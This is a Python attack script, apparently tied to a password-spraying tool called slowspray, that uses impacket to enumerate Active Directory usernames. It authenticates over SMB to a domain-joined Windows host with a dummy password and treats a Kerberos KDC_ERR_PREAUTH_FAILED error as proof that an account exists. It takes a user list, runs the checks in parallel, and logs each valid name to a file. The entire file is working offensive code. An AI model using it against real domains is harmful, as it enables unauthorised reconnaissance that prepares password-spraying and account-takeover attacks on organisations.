# Super niche edge case I found when building slowspray that allows you to make a kerberos request through a domain joined Windows machine.
# by authenticating to SMB in this way the Windows machine makes a Kerberos request on your behalf to the dc and will return not a STATUS_LOGON_FAILURE but a Kerberos KDC_ERR_PREAUTH_FAILED if the user exists.
from __future__ import division
from __future__ import print_function
import sys
import os
from pebble import ProcessPool
import argparse

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser
import logging

from impacket import version
from impacket.dcerpc.v5 import transport


def run(username, password, domain, hashes, aesKey, doKerberos, kdcHost, remoteName, remoteHost):
    lmhash = ''
    nthash = ''
    if hashes is not None:
        lmhash, nthash = hashes.split(':')

    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(445)
    rpctransport.setRemoteHost(remoteHost)
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash,nthash, aesKey)
    rpctransport.set_kerberos(doKerberos, kdcHost)

    scmr = rpctransport.get_dce_rpc()
    try:
        scmr.connect()
    except Exception as e:
        if str(e).find('KDC_ERR_PREAUTH_FAILED') != -1:
            print(username)
            if options.o is not None:
                with open(options.o, 'a') as f:
                    f.write('{}\n'.format(username))


def mt_execute(username):  # multithreading requires a function
    try:
        run(username, 'IUHFeruifgKI$F(jfeyrbuifer324!!!!!s', options.d, None, None, None, None, options.target, options.target)
    except Exception as e:
        print(str(e))


if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help=True, description="")
    parser.add_argument('-u', action='store', help='Username or path to file containing usernames 1 per line')
    parser.add_argument('-d', action='store', help='FQDN to use')
    parser.add_argument('-o', action='store', help='File to output to')
    parser.add_argument('target', action='store', help='IP to check the account against')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-threads', action='store', default=5, type=int, help='Number of threads to use (default=1)')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)


    if options.d is None:
        options.d = ''

    users = []
    users_cleaned = []

    if os.path.isfile(options.u):
        with open(options.u, 'r') as f:
            users = f.readlines()
            f.close()

        for item in users:
            item = item.replace("\r", "")
            users_cleaned.append(item.replace("\n", ""))
    else:
        users_cleaned.append(options.u)
    with ProcessPool(max_workers=options.threads) as thread_exe:  # changed to pebble from concurrent futures because pebble supports timeout correctly
        for username in users_cleaned:
            try:
                out = thread_exe.schedule(mt_execute, (username,))
            except Exception as e:
                print(str(e))
